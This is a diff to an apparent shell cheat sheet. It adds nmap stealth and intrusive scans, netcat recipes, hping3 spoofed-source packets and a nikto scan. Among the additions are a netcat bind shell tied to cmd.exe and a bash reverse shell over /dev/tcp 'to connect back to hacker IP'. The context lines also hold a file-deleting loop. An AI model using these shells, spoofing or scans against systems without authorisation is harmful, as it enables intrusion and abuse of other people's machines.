@@ -32,6 +32,53 @@ cat /etc/default/ntp
 sudo vi /etc/default/ntp
 sudo service ntp restart
 
+# nmap
+nmap -sT 10.10.10.10  # Standard TCP Connect Scan. Best if you want to stay "standard" traffic. 
+nmap -sS 10.10.10.10  # SYN only packets. Stealthier in an environment with no IDS, louder in an environment with it. 
+nmap -sS -A 10.10.10.10  # Very noisy scan, gets OS and Services
+nmap -sF 10.10.10.10  # FIN Scan
+nmap -sA 10.10.10.10  # ACK scan
+nmap -sN 10.10.10.10  # NULL scan
+nmap -sX 10.10.10.10  # XMAS scan
+nmap -sU 10.10.10.10  # UDP scan
+nmap -P0 10.10.10.10  # Do not Ping before scanning
+nmap -PA80,21,23,25 10.10.10.10  # List ports to scan, includes ACK
+nmap -PS80,21,23,25 10.10.10.10  # List ports to scan, SYN only
+nmap -PU161,53 10.10.10.10  # Lists ports to scan, UDP
+nmap -PE 10.10.10.10  # Use ICMP Echo for mapping
+nmap -PP 10.10.10.10  # Use ICMP Echo for mapping
+nmap -PM 10.10.10.10  # Use ICMP Netmask request for mapping
+nmap -PB 10.10.10.10  # Use default ICMP. Both TCP ack and ICMP Echo request sweeps in parallel 
+cd /usr/share/nmap/scripts  # List the NMAP scripts
+cat script.db | grep intrusive  # Find out which nmap scripts are considered intrusive
+nmap -n -sC --script=sshv1.nse 10.10.10.0/24 -p 22  # Check for SSHv1
+nmap -n -sC --script=nbtstat.nse 10.10.10.0/24  # Looks for Netbios traffic 
+nmap -sV --script ssl-enum-ciphers -p 443 10.10.10.10
+
+# NetCat
+nc -l 8888  # Listen for connections on this port (Or -L on Windows), 
+nc www.website.com 80  # Then do GET / HTTP/1.0 - Does banner grabbing
+nc 10.10.10.10 8888  # connect to a port on a target
+nc -v -w 2 -z 10.10.10.10/24 10-2000 # Basic port scanner. Verbose, short wait, zero data sent
+nc -nv 10.10.10.10 8888 -e cmd.exe # (Run on Windows Box) Ties port 8888 to Command Shell
+
+nc -lnvp 8888 > foo.txt  # Two part command, This tells receiving system to save input to foo.txt
+nc -lnvp 10.10.10.10 8888 < foo.txt  # Second part, reads foo.txt and sends it to the other system
+
+
+# HPing examples. More here: http://www.rationallyparanoid.com/articles/hping.html
+hping3 example.com -S -A -F -V -p 443  # SYN, ACK, FIN, port 443
+hping3 example.com -S -V -p 443 -i 5   # Ping 443 every 5 seconds with a SYN packet
+hping3 example.com -S -p 443 -i u100000  # Ping every .1 seconds, verbose removed
+hping3 example.com -S -p 443 -i u10000 -c 500  # Ping every .01 seconds, stop after 500 packets, verbose removed
+hping3 example.com --udp --spoof 192.168.1.150  # Send UDP packets spoofed to be from source 192.168.1.150
+hping3 example.com --udp --rand-source  # Send UDP packets spoofed to be from various random source IP addresses
+hping3 example.com -V --udp --data 100 # Send UDP packets with the data portion padded with 100 bytes to host example.com
+hping3 --baseport 53 --destport 80 --syn 10.10.10.10  # Sent SYN packet from 53 to 80 (Subsequent pings come from subsequent 
+
+
+# Nikto for web scans
+nikto --host 10.10.10.10
 
 netstat -ant
 for file in $(ls -1 .); do if [ -s "$file" ]; then rm $file; fi; done
@@ -131,5 +178,5 @@ identify -format "%f F:%[EXIF:Flash]\n" *.jpg | egrep " F:(0|16|24|32)$" # Show 
 find / \( -path /proc -o -path /sys \) -prune -o -print # Search the file system, but don't descend into the /sys or /proc directories.
 history | awk '{print $2}' | sort | uniq -c | sort -rn | head -10 # Count and show most popular bash_history entries
 
-
+/bin/bash -i > /dev/tcp/10.10.10.10/8080 0<&1 2>&1   # Reverse shell. Run this on victim IP to connect back to hacker IP
 
